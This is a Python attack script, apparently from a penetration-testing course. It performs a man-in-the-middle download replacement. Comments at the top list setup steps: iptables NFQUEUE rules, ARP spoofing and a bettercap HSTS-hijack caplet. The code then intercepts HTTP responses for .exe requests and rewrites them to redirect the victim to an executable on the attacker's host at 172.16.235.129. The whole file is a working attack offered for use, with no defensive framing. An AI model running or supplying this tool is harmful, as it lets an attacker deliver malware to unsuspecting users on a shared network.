#!/usr/bin/env python3

# Steps
# 1. $ sudo service apache2 start
# 2. $ sudo iptables -F
# 3. $ sudo iptables -I INPUT -j NFQUEUE --queue-num 0
# 4. $ sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
# 5. $ sudo arp_spoof.py (with -t and -g set)
# 6. $ sudo bettercap -caplet hstshijack/hstshijack
# 7. $ sudo https_replace_downloads.py

from struct import pack
import netfilterqueue
import scapy.all as scapy

ack_list = []


def get_modified_packet(packet):
    ack_list.remove(packet[scapy.TCP].seq)
    print('[+] replacing file')
    packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: http://172.16.235.129/download.exe\n\n'
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 8080:
            if b'.exe' in load and b'172.16.235.129' not in load:
                print('[+] .exe request')
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 8080:
            if scapy_packet[scapy.TCP].seq in ack_list:
                modified_packet = get_modified_packet(scapy_packet)
                packet.set_payload(bytes(modified_packet))
                print(modified_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
